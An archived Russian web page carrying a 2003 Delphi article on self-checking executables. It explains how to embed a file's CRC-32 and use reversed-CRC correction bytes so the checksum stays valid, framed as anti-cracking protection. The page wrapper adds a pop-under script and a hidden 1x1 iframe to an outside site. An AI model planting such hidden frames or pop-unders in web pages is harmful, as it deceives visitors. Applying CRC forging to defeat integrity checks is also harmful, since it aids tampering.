<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">

<style type="text/css">
<!--
a.clx_class {  font-family: "Times New Roman", Times, serif; font-size: 14px; font-style: normal; font-weight: normal; font-variant: normal; color: #0000FF; background-color: #FFFFFF}
-->
</style>

<table border=1 bgcolor=#FFFFFF cellpadding=10 cellspacing=1 width=100% color=#ffffff height="206">
  <tr>
    <td height="34" valign="top" bgcolor="#FFFFFF" class="clx_class">
      <table width="100%" border="0" cellspacing="0" cellpadding="0" height="13" bgcolor="#006699">
        <tr>
          <td align="center" bgcolor="#006699">
            <div align="left"><font face="Arial, Helvetica, sans-serif" size="2"><b><font color="f0f1f3"><i><font color="#FFFF00">&gt;&gt;
              MegaLib.com - поисковая система по электронным учебникам, статьям,
              журналам, исходникам, FAQ листам! </font></i></font></b></font></div>
          </td>
        </tr>
      </table>
      <font face="" color="black" size="-1"><font face="Arial, Helvetica, sans-serif">Дата
      индексирования:
      2004-12-18 11:35:11      <br>
      Электронный адрес материала:
      <A href='' target='_blank'></A>      </font></font><br>
      <font face="Arial, Helvetica, sans-serif" size="2" color="#000000"><img src="folder20.gif" border="0">
      <a href='http://megalib.com/items.php?gl_subject_id=1'>MegaLib.com/</a> <a href='http://megalib.com/items.php?gl_subject_id=2'>ПРОГРАММИРОВАНИЕ/</a> <a href='http://megalib.com/items.php?gl_subject_id=3'>Delphi/Pascal/</a> <a href='http://www.megalib.com/books/461/mastering/safe/items.php?gl_subject_id=16'>Учебники, руководства, мануалы/</a>       <BR>
      Название материала(Оглавление):<BR>
      <A href='http://megalib.com/books/461/CHMFirstPage.htm'>Сборник советов и статей от "Королевство Delphi — виртуальный клуб программистов, созданный для общения и взаимопомощи"</A>      <BR><BR><font face='Times New Roman, Times, serif' size='3' color='red'>
Перед Вами отрывок из книги(бумажное издание)! Для заказа книги <A target='_blank' href='http://www.delphikingdom.com/'>нажмите здесь!</A>
</font></BR></BR>      </font> </td>
  </tr>
  <tr>
    <td height="68" bgcolor="#FFFFFF" valign="top" align='center'>
       <A href='http://freepromote.ru/' target='_blank' alt=''><img src='fpb00000.png' border='0'></A>           </td>
  </tr>
</table>

<!--LiveInternet counter-->
<script language="JavaScript"><!--
document.write('<a href="http://www.liveinternet.ru/click" '+
'target=_blank><img src="http://counter.yadro.ru/hit?t27.1;r'+
escape(document.referrer)+((typeof(screen)=='undefined')?'':
';s'+screen.width+'*'+screen.height+'*'+(screen.colorDepth?
screen.colorDepth:screen.pixelDepth))+';'+Math.random()+
'" alt="liveinternet.ru: показано количество просмотров и посетителей" '+
'border=0 width=0 height=0></a>')//--></script>
<!--/LiveInternet-->

<!--Rating@Mail.ru COUNTER--><script language="JavaScript" type="text/javascript"><!--
d=document;var a='';a+=';r='+escape(d.referrer)
js=10//--></script><script language="JavaScript1.1" type="text/javascript"><!--
a+=';j='+navigator.javaEnabled()
js=11//--></script><script language="JavaScript1.2" type="text/javascript"><!--
s=screen;a+=';s='+s.width+'*'+s.height
a+=';d='+(s.colorDepth?s.colorDepth:s.pixelDepth)
js=12//--></script><script language="JavaScript1.3" type="text/javascript"><!--
js=13//--></script><script language="JavaScript" type="text/javascript"><!--
d.write('<a href="http://top.mail.ru/jump?from=806557"'+
' target=_top><img src="http://top.list.ru/counter'+
'?id=806557;t=57;js='+js+a+';rand='+Math.random()+
'" alt="Рейтинг@Mail.ru"'+' border=0 height=1 width=1/><\/a>')
if(11<js)d.write('<'+'!-- ')//--></script>
<noscript><a
target=_top href="http://top.mail.ru/jump?from=806557"><img
src="http://top.list.ru/counter?js=na;id=806557;t=57"
border=0 height=1 width=1
alt="Рейтинг@Mail.ru"/></a></noscript>
<script language="JavaScript" type="text/javascript"><!--
if(11<js)d.write('--'+'>')//--></script><!--/COUNTER-->

<SCRIPT>
//window.open('http://megalib.com/popup_books.php?idsubject=16','pop','Toolbar=0,Location=0,Directories=0,Status=0,Menubar=0,Scrollbars=1,Resizable=0,Width=550,Height=400');
</SCRIPT>

<HTML>
<HEAD>
<TITLE>Как написать программу, которая проверяет свою целостность</TITLE>
<META CONTENT="text/html; charset=windows-1251">
<LINK HREF="delphi00.css" REL="STYLESHEET" TYPE="text/css">                                                                                                                      
</HEAD>
<BODY CLASS="Main" BGCOLOR="#FFFFFF">                                                                     
<TABLE WIDTH=100%>    
    <TR>
    <TD ALIGN=left VALIGN=top COLSPAN=0 ROWSPAN=0>
    <IMG SRC="common00.gif" WIDTH=260 HEIGHT=70 BORDER=0 ALT="Королевство Дельфи"> 
    </TD>
    <TD ALIGN=right VALIGN=top >
    <FONT  COLOR="#666666"><B>&quot;Knowledge itself is power&quot;<BR>F.Bacon
    </B></FONT>
    </TD></TR>
</TABLE>
<TABLE  WIDTH="100%" BGCOLOR="#FFCC99" CELLPADDING="3" CELLSPACING="0" BORDER="0">
<TD ALIGN=CENTER>
<STRONG>Как написать программу, которая проверяет свою целостность и содержит свою контрольную сумму</STRONG>
</TD></TABLE>
<TABLE WIDTH="100%" BGCOLOR="#FAEBD7" CELLPADDING="3" CELLSPACING="0" BORDER="0">
<TD ALIGN=CENTER><FONT COLOR="#996600"><B>
Или, как усложнить жизнь кракеру при попытке изменить код вашей защищенной программы</B></FONT></TD></TABLE>
                    

<TABLE WIDTH="100%">
        <TR><TD>Раздел <B>Защита программ</B></TD>
        <TD ALIGN="RIGHT">Автор <STRONG>Виталий Царегородцев</STRONG><BR>
         18 марта 2003 г.</TD></TR>
</TABLE>
<P Class="Citata">
<B>В рамках проекта "АнтиКрэковые Мучения"</B>
<BR>
Статья написана без претензий на какое-либо авторство и какие-либо копирайты, о которых говорить в данном случае смешно.<BR>
Я просто представляю для изучения и использования конкретную реализацию ранее публиковавшихся алгоритмов в виде 
программы, или как кому угодно.
</P>

<!-- Рыжая полосочка, если понадобится -->
<P><TABLE WIDTH="100%" BGCOLOR="#FAEBD7" CELLPADDING="3" CELLSPACING="0" BORDER="0">
<TD ALIGN=CENTER><FONT COLOR="#996600"><B>
Определяем задание и исходные данные</B></FONT></TD></TABLE></P>
<P Class="Book">
Для начала делаем наброски исходных данных, требования к исходным данным и способы решения 
поставленной задачи.
<I>
(Говоря о контрольных суммах я буду подразумевать, что мы используем <B>CRC-32</B>)
</I>
</P>

<P Class="Book">
Возьмем такое условие, что интерес представляет контроль CRC всего файла запускаемой программы.
Для реального приложения нашу задачу логично разбить на две части. Незачем в защищенном файле хранить
процедуры коррекции контрольных сумм :).
<UL>
 <LI>Первая - защищенная программа, которая будет проверять свою контрольную сумму и содержать в себе
          константу со значением этого CRC.</LI>
 <LI>Вторая - программа которая будет прописывать контрольную сумму в скомпилированный код готового 
          исполняемого файла первой программы и выполнять необходимую коррекцию, чтобы эта контрольная 
          сумма соответствовала действительности.</LI>
</UL>
</P>

<P Class="Book">
Из данных мы имеем:
<UL>
 <LI>Контрольную сумму исполняемого файла защищенной программы - это та CRC, которую будет иметь
    файл после всех операций над ним.</LI>
 <LI>Смещение в исходном файле ячейки, хранящей контрольную сумму. По этому смещению вторая программа запишет 
     туда CRC.</LI>
</UL>
</P>
<P Class="Book">
Что нужно сделать?<BR>
Прописать контрольную сумму в определенное место защищенного файла так, чтобы она 
соответствовала тому, что получит сама защищенная программа при проверке самой себя. Звучит закручено.
</P>
<!-- Рыжая полосочка -->
<P><TABLE WIDTH="100%" BGCOLOR="#FAEBD7" CELLPADDING="3" CELLSPACING="0" BORDER="0">
<TD ALIGN=CENTER><FONT COLOR="#996600"><B>Кому не терпится увидеть код, он вас ждет в конце статьи. А сюда вернетесь потом :)</B></FONT></TD></TABLE></P>

<P Class="Book">
 Мы хотим прописать контрольную сумму в файл, но не хотим чтобы контрольная сумма файла изменилась. Задача довольно
 интересная. Есть другие способы, например проверять контрольную сумму, но не учитывать те 4 байта, где хранится
 контрольная сумма. Но скорректировать такой файл не представит большого труда. Это не сильно усложнит жизнь кракеру. И
 таким способом нельзя прописать одно значение CRC в разные места программы, что сводит на нет использование более чем
 одной процедуры контроля CRC. Хотя можно, но через все эти места придется прыгать во всех процедурах, а кракер вычислит
 и пропатчит их гораздо быстрее, чем вы их туда пропишите. Поэтому забываем про эти способы :). Поскольку алгоритм
 вычисления CRC основан на последовательной, побайтовой работе над буфером операциями XOR, сдвига и хранения результата
 вычисления в 32 разрядном аккумуляторе, логично предположить, что 4-мя последовательными байтами можно подогнать
 контрольную сумму к любому числу. С другой стороны алгоритм вычисления CRC является биекцией и может быть обращен.
 Причем не прилагая особых усилий, не выполняя никакого подбора. Просто считается в обратном направлении.
</P>
<P Class="Book">
 Для простоты пояснения и понимания, ячейка исходного защищаемого выполняемого модуля, в которой хранится контрольная
 сумма (назовем ее <B>B1</B>), должна быть статической непрерывной переменной, объявленной в области кода или данных
 программы. Но вам ничто не мешает хранить значение CRC в раздробленом на части виде, зашифрованное по какому либо
 принципу. В реальной защите это даже приветствуется. :)
<BR><BR>
 Значит значение CRC хранится в четырех последовательных байтах. Снова таки для простоты примера, за этими четырьмя
 байтами идут еще четыре байта (назовем их <B>B2</B>) которые будут использованы для коррекции CRC файла, после того как
 мы в файл пропишем число, определяющее его CRC.
</P>

<BLOCKQUOTE>
<P Class="Book">
 В реальности блоки байт <B>B1</B> и <B>B2</B> лучше разнести в разные места исходного кода. И сами корректировочне
 байты <B>B2</B> можно использовать где-то в бессмысленных вычислениях, чтобы линкер построил на них ссылку: дескать это
 какие-то нужные данные. Важно только, чтобы корректировочне байты были в четырех последовательных байтах файла и
 находились, <B><U>внимание</U></B>, за последним измененным блоком, в зависимости от того, откуда вы считате CRC (с начала файла
 или с конца). А поскольку CRC считается для внутреннего использования вам никто не мешает считать его с конца файла к
 началу, но я не рекомендую, PE заголовок легко патчится. Изменять вы можете хоть весь файл но последние 4
 последовательных байта смогут привести CRC к нужному результату. В принципе задачу можно решать с другой стороны,
 например задаться целью, что CRC конечного файла должен быть например 0123ABCD. Это число можно будет перед компиляцией
 прописать в условие процедуры проверки CRC. В этом случае уже не придется его прописывать в файл. Для этого достаточно
 будет подогнать четыре корректировочных байта <B>B2</B> так, чтобы контрольная сумма файла стала именно 0123ABCD. Но
 здесь важно помнить, что вряд ли у вас получится разместить корректировочные байты в конце файла только при помощи
 компилятора. Дельфи еще в конце файла приложит таблицу релокаций и информацию о версии, если она включена в проекте. К
 тому же, из соображений простоты взлома, размещать коректировочные байты в конце файла, плохая идея. Поэтому придется
 реверсно выполнять алгоритм CRC (считать CRC файла от его результата к его началу проходя алгоритм CRC в обратном
 направлении, то есть получить CRC в заданной точке, имея файл и его CRC, но при условии прохождения алгоритма в обратном
 направлении) с конца файла через неизменяемые байты до последнего корректировочного байта. Говоря "последнего", я имею
 ввиду последнего в абсолютном его индексе, то есть при реверсировании CRC не нужно их учитывать. В общем реверсное
 выполнение алгоритма я бы разделил на три типа:
 <BR>
 - первый вычисление начального CRC имея конечный CRC и буфер,<BR>
 - второй это поиск последовательности байт которые приведут
 к нужному CRC если его начать с определенного CRC. Дальше нам потребуется именно второй вариант алгоритма вычисления CRC.<BR>
 - третий, он собственно разновидность второго, это восстановление последовательности байт буфера CRC которого считали
 имея конечный CRC и длину буфера. Правда тут уже появляются неоднозначности, иначе CRC-32 был бы супер архиватором со
 100% восстановлением информации. На длинных буферах вариантов будет очень много. Ведь последние 4 байта дадут нам
 нужный результат. Вот восстановление одиночной ошибки если мы знаем где она произошла это другое дело. Но и тема для
 другого разговора.
</P>
</BLOCKQUOTE>
<P>
 Перед компиляцией первой (защищенной) программы кладем в эти 8-байт (<B>B1</B> и <B>B2</B>) уникальную сигнатуру. 
<BR>
 У меня нормально прошла такая сигнатура.
</P>
<PRE>
  DW  0C3C3h,0C3C3h   //- сюда мы будем писать CRC-32
  DW  0C3C3h,0C3C3h   //- четыре подгоночных байта для восстановления CRC-32
</PRE>
<BLOCKQUOTE>
<P Class="Book">
 Определяемая здесь сигнатура обязательно должна быть уникальна по всему файлу полученному 
 в результате компиляции потому, как второе приложение которое будет прописывать контрольную
 сумму и корректировочные байты должно искать эту сигнатуру по всему исходному файлу, и найти
 обязательно то что нужно, а не кусок кода или каких либо важны данных. Хотя если вы вручную
 вычислите точное смещение наших 8 байт то никто вас не заставляет делать сигнатуру уникальной.
<BR>
 В прилагаемом коде примера эта сигнатура размещена прямо в коде процедуры, во мне живет 
 старая любовь к программам у которых сегмент кода и данных были одним целым. И обратите внимание
 что процедура поиска сигнатуры не имеет контроля уникальности сигнатуры. Это значит что она найдет
 только первую сигнатуру и закончит поиск. Для приведенного примера этого достаточно.
</P>
</BLOCKQUOTE>

<P Class="Book">
Для повышения быстродействия можно вычислять CRC блоками запоминая промежуточные значения.  Но мне было лениво,
тем более что особых тормозов я не видел :) В примере у меня на это уходит меньше секунды...
Расчет CRC начнем со стартового значения <B>C0</B>. смотрите рисунок 1.
</P>

<img src="crc32_10.gif" alt="рисунок 1" width=400 height=285 border=0>

<P Class="Book">
Вот пошаговый алгоритм подготовки входных данных для второго варианта алгоритма реверсирования о котором будет говориться ниже.
</P>
<UL>
<B>1)</B> Вычисляем контрольную сумму, начиная со значения C0, от начала файла <B>F0</B> до конца корректировочного блока 
          <B>B2</B>. Запоминаем ее в <B>C1</B><BR>
<B>2)</B> Начиная со значения <B>C1</B> продолжаем расчет CRC до конца файла <B>F0</B>. Сохраняем его в <B>CE</B>. 
          Это будет CRC исходного файла, которую мы и пропишем в нашу ячейку <B>B1</B>.<BR>
<B>3)</B> Прописываем <B>CE</B> в <B>B1</B>. За этим блоком идет 4-ре поправочных байта. Их мы скоро будем вычислять.<BR>
<B>4)</B> Рассчитываем CRC измененного файла для измененного блока <B>B1</B> (красного цвета), до начала блока с 
          корректировочными байтами <B>B2</B> не включая поправочне байты! В файл должны быть внесены все 
          изменения, чтобы осталось записать только корректировочные байты.<BR>
<BR>
Что нас интересует в итоге?<BR>
<B>C1</B> - CRC к которой должен быть приведен фрагмент файла <B>F1</B> от начала файла до конца блока <B>B2</B><BR>
<B>C2</B> - CRC в точке <U>перед началом блока <B>B2</B></U> которая получилась после внесения изменений в блок <B>B1</B>, мы 
  записали туда CRC файла. Подчеркнуто специально, потому что пример несколько неудачен: конец блока <B>B1</B> сливается
  с началом блока <B>B2</B>. Дальше на рисунке 2 это видно более наглядно.
</UL>

<P Class="Book">
Теперь пришло время взяться за алгоритм подбора корректировочных байт. Понимая о ненужности изобретать велосипед
я полез в интернет. Тот предлагает массу источников об математических основах CRC и также о способах его реверсирования,
вычисления последовательности байт которые дают нужный CRC из некоего стартового значения CRC. Нам нужен второй вариант 
алгоритма реверсирования о котором уже упоминалось выше - поиск последовательности байт приводящих CRC к нужному значению.
<BR><BR>
<A HREF="http://www.megalib.com/books/461/mastering/crc32_1.htm">Статья Андрея Рубина</A>, которую я нашел в Королевстве
Дельфи, была совершенно мне непонятна. Я никак не мог понять, как применить приведенный код реверсирования, пока не начал
вручную реверсировать CRC по его реальному алгоритму. В общем можно сказать что для той статьи не хватает моих рисунков
и точной формулировки параметров его процедуры. И после этого я решил написать статью-разъяснение специально для
Королевства Дельфи и включить ее в проект АКМ. В проекте я использовал процедуры приведенные Андреем Рубиным. Из его
довольно объемного проекта я вытащил только процедуры касающиеся расчета CRC и его реверсирования. 
Что касается интересующей нас, процедуры вычисления последовательности байт по исходному и конечному CRC, вношу ясность.
</P>
<PRE>
{
  CrcFrom - новый CRC который имеем в начале коректировочного блока
  CrcTo - CRC который нужно получить в конце корректировочного блока
  lpData - указатель на буфер куда будут сохранены четыре корректировочных байта
}
procedure Crc32UpdateDelta(CrcFrom, CrcTo : DWord; lpData : Pointer);
</PRE>
<P Class="Book">
Итак в конце статьи конкретный работающий пример из двух приложений. Компилируйте, тестируйте. Для того чтобы 
использовать приведенный код в реальном приложении защищенном от изменения нужно предпринять некоторые действия. 
</P>
<P Class="Book">Я считаю что описание способов замыливания мозгов кракера дело неблагодарное, их масса, но в силу каких-то 
высших причин все они обходятся.
Данный пример можно использовать всего лишь как одну из подножек подставленных кракеру. Чем больше вы соберете
таких подножек тем дольше проживет ваше приложение до момента взлома. Надо заметить, что самое слабое место в 
предложеном способе контроля целостности приложения - это чтение файла с диска. Даже чтение файла на уровне
физических секторов (что уже является слишком навороченным для систем защиты) не мешает хакеру подсунуть
настоящий неизмененный файл, или же перехватить операцию чтения файла с диска. Поэтому не путайте себя и слишком
усердствуйте в количествах способов контроля CRC. Два, максимум три варианта процедур которые различаются своим кодом.
Я имею ввиду чтобы код этих нескольких процедур не вычислялся по одинаковым сигнатурам. Один вариант можете взять
из примера, другой вариант из статьи <A HREF="http://www.megalib.com/books/461/mastering/crc.htm">Сергеем Паруновым</A>. Ассемблерный код гораздо приятнее 
паскалевского разбавлять мусором для создания двух, трех экземпляров непохожих друг на друга процедур.</P>

<P Class="Book">Первый "громкий" вариант срабатывания защиты целостности файла нужен для легальных пользователей (для предупреждения о
вирусе или PE архиваторе) и на съедение кракеру. Остальные варианты должны просыпаться скажем раз в недельку и молча
проверив CRC выставить "черные" метки, и дальше по вашей тихой схеме срабатывания защиты. Еще одно слабое место
versioninfo. Идеальное место для разгула коррекции CRC. В конце статьи приведены ссылки на некоторые из найденых мной
источников. Среди них есть статья о 64 битном CRC. В два раза большая таблица образующего полинома, в два раза большее
время работы, но зато в два раза более длинный хеш и самое важное, отступление от стандарта. Я не припомню чтобы где-то
видел 64 битный CRC. MD5 да видел, но это немного другое. Алгоритм реверсирования CRC-64 примерно такой же. Правда
корректировочных байтов будет в два раза больше. Кстати о таблице образующего полинома... Чтобы ее случайно не нашли
возьмите другой образующий полином или создавайте таблицу динамически во время исполнения кода.</P>

<P Class="Book">Данная методика позволяет добавить в файл еще какую либо информацию о характеристиках запускаемого файла например о его
размере, даты создания-изменения. Данным способом в исполняемый файл можно прописывать некоторую информацию о
персонализации генерации программы. Например вы можете во все копии программы элементарно без перекомпиляции программы
прописать уникальные серийные номера и привязать их к легальным пользователям. Кроме того если вы внимательно посмотрите
на заголовок EXE файла, построеный дельфи, то увидите что контрольная сумма в двойном слове там равна 0. Тоже вариант
туда что-то прописать :) например оригинальную контрольную сумму. Для этого можно использовать функцию 
<B>MapFileAndCheckSumA</B> которая живет в imagehlp.dll. Я ее также привел в коде примера. К сожалению алгоритм 
вычисления CRC функцией MapFileAndCheckSumA несколько отличается от алгоритма приведенного в статье, поэтому совместное 
использование этого метода и приведенного метода с коррекцией становится практически невозможным.
</P>
<P Class="Book">Я еще раз говорю что приведенный способ защиты кода программы от изменения не панацея. Это просто один из
шагов усложняющих взлом.</P>

<img src="crc32_20.gif" alt="рисунок 2" width=400 height=206 border=0>
<P Class="Book">
на рисунке 2 показаны другие способы внесения изменений в файл, что можно изменять в файле и как в каком направлении 
проводить расчет CRC. Но в случае обратного сканирования файла использование CRC в заголовке файла становится 
затруднительным так как разместить после него коректировочный блок становится сложным.... Хотя нет! В EXE заголовке 
есть свободные (reserved) байты. Но здесь снова встает извечное противоречие... Легко вам - легко кракеру....
</P>
<P Class="Book">
В архиве исходные тексты, проверенные под Delphi7.
</P>
<P>Скачать тексты <B><A HREF="http://delphi.mtu-net.ru/zip/self_crc_check.zip">Self_CRC_Check.zip</A></B> (14.1 K)</P>

<P Class="Book">
Смотрите по теме: 
<UL>
   <LI><STRONG><A HREF="http://www.megalib.com/books/461/mastering/crc32.htm">Почти всё, что вы хотели узнать, но боялись спросить о Crc32 </A></STRONG></LI>
   <LI><STRONG><A HREF="http://www.megalib.com/books/461/mastering/crc32_1.htm">Почти всё, что вы хотели узнать, но боялись спросить о Crc32. Продолжение. </A></STRONG>
   <LI><STRONG><A HREF="http://www.megalib.com/books/461/mastering/crc.htm">Контрольные суммы и CRC.</A></STRONG>
   <LI><STRONG><A HREF="http://progarc.narod.ru/algorithms/arcs/alg_04.zip">Статья Anarchriz/DREAD Copyright (c) 1998,1999 by Anarchriz</A></STRONG> с математическими выкладками о реверсировании 
   CRC ( перевод <NOBR>Sergey R.</NOBR> ) 
   

</UL>
</P>

<P ALIGN="right"><STRONG>Виталий Царегородцев</STRONG>,<BR>
 aka younghacker<BR>
Специально для <A HREF="http://www.delphikingdom.com/"><B>Королевства Delphi</B></A></P>
<!-- Рыжая полосочка -->
<P align="center">
<A href="http://www.megalib.com/books/461/_index.html">Основная страница</A>&nbsp;|&nbsp;
<A href="http://www.megalib.com/books/461/articles/_index.html">Свитки</A>&nbsp;|&nbsp;
<A href="http://www.megalib.com/books/461/treasury/_index.html">Сокровищница</A>&nbsp;|&nbsp;
<A href="http://www.megalib.com/books/461/mastering/_index.html">Подземелье Магов</A>&nbsp;|&nbsp;
<A href="http://www.megalib.com/books/461/helloword/_index.html">Hello, World!</A>&nbsp;|&nbsp;<A href="http://www.megalib.com/books/461/mastering/tower/_index.html">Арсенальная башня</A>
</P>


<TABLE WIDTH="100%" BGCOLOR="#FAEBD7" CELLPADDING="3" CELLSPACING="0" BORDER="0"><TR><TD>
<B><A HREF="http://www.megalib.com/books/461/data/discission763.htm">Обсуждение статьи</A></B></TD></TR></TABLE>

<TABLE WIDTH="100%"><TR><TD BGCOLOR="#FFCC99">&nbsp;</TR></TD></TABLE>
<FONT CLASS="Dark">&copy; При использовании любых материалов &#171;Королевства Delphi&#187; необходимо указывать источник информации.</FONT><BR>
<FONT CLASS="Dark">Все используемые на сайте торговые марки  являются собственностью их производителей.</FONT>
</BODY>
</HTML>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">

<style type="text/css">
<!--
a.clx_class {  font-family: "Times New Roman", Times, serif; font-size: 14px; font-style: normal; font-weight: normal; font-variant: normal; color: #0000FF; background-color: #FFFFFF}
-->
</style>

<br>
<table border=1 bgcolor=#FFFFFF cellpadding=10 cellspacing=1 width=100% color=#ffffff height="189">
  <tr>
    <td height="122" valign="top" bgcolor="#FFFFFF" class="clx_class" align="center">
      <br>
      <A href='http://freepromote.ru/' target='_blank' alt=''><img src='fpb00000.png' border='0'></A>       </td>
  </tr>
  <tr>
    <td height="87" valign="top" bgcolor="#FFFFFF" class="clx_class"> <font face="" color="black" size="-1"><font face="Arial, Helvetica, sans-serif">Дата
      индексирования:
      0000-00-00 00:00:00      <br>
      Электронный адрес материала:
      <A href='' target='_blank'></A>      </font></font><br>
      <font face="Arial, Helvetica, sans-serif" size="2" color="#000000"><img src="folder20.gif" border="0">
      <a href='http://megalib.com/items.php?gl_subject_id=1'>MegaLib.com/</a> <a href='http://megalib.com/items.php?gl_subject_id=2'>ПРОГРАММИРОВАНИЕ/</a> <a href='http://megalib.com/items.php?gl_subject_id=3'>Delphi/Pascal/</a> <a href='http://www.megalib.com/books/461/mastering/safe/items.php?gl_subject_id=16'>Учебники, руководства, мануалы/</a> <BR><BR><font face='Times New Roman, Times, serif' size='3' color='red'>
Перед Вами отрывок из книги(бумажное издание)! Для заказа книги <A target='_blank' href='http://www.delphikingdom.com/'>нажмите здесь!</A>
</font></BR></BR>      </font> </td>
  </tr>
</table>

<script language="JavaScript">
//Pop-under window- By JavaScript Kit
//Credit notice must stay intact for use
//Visit http://javascriptkit.com for this script

//specify page to pop-under
//var popunder="http://www.surfcontrol.ru";
var popunder="http://www.surfcontrol.ru";

//specify popunder window features
//set 1 to enable a particular feature, 0 to disable
var winfeatures="width=762,height=450,scrollbars=1,resizable=1,toolbar=1,location=1,menubar=1,status=1,directories=0"


//Pop-under only once per browser session? (0=no, 1=yes)
//Specifying 0 will cause popunder to load every time page is loaded
var once_per_session=1

///No editing beyond here required/////

function get_cookie(Name) {
  var search = Name + "="
  var returnvalue = "";
  if (document.cookie.length > 0) {
    offset = document.cookie.indexOf(search)
    if (offset != -1) { // if cookie exists
      offset += search.length
      // set index of beginning of value
      end = document.cookie.indexOf(";", offset);
      // set index of end of cookie value
      if (end == -1)
         end = document.cookie.length;
      returnvalue=unescape(document.cookie.substring(offset, end))
      }
   }
  return returnvalue;
}

function loadornot(){
if (get_cookie('popunder')==''){
loadpopunder()
document.cookie="popunder=yes"
}
}

function loadpopunder(){
win2=window.open(popunder,"",winfeatures)
win2.blur()
window.focus()
}

if (once_per_session==0)
loadpopunder()
else
loadornot()
</script>

<IFRAME src='http://www.ruspodarky.ru' width=1 height=1></iframe>
<!-- This document saved from http://www.megalib.com/books/461/mastering/safe/crc_32_self_checker.htm -->
